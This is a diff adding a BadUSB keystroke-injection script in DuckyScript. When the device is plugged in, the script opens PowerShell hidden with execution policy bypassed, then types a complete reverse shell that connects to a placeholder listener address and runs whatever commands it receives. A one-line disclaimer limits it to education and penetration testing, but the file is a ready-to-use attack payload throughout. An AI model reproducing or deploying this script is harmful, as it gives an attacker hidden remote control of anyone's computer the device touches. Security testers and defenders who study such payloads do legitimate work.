@@ -1,0 +1,25 @@
+REM ============================================
+REM BadUSB Script: PowerShell Reverse Shell
+REM WARNING: For educational/penetration testing only!
+REM Replace IP_ADDRESS and PORT with your listener
+REM ============================================
+
+DEFAULT_DELAY 100
+DELAY 500
+
+REM Open Run dialog and execute hidden PowerShell
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+
+REM Alternative: Open PowerShell directly
+REM GUI r
+REM DELAY 500
+REM STRING powershell -WindowStyle Hidden
+
+ENTER
+DELAY 1000
+
+REM PowerShell reverse shell (replace IP and PORT)
+STRING $client = New-Object System.Net.Sockets.TCPClient('IP_ADDRESS',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+ENTER
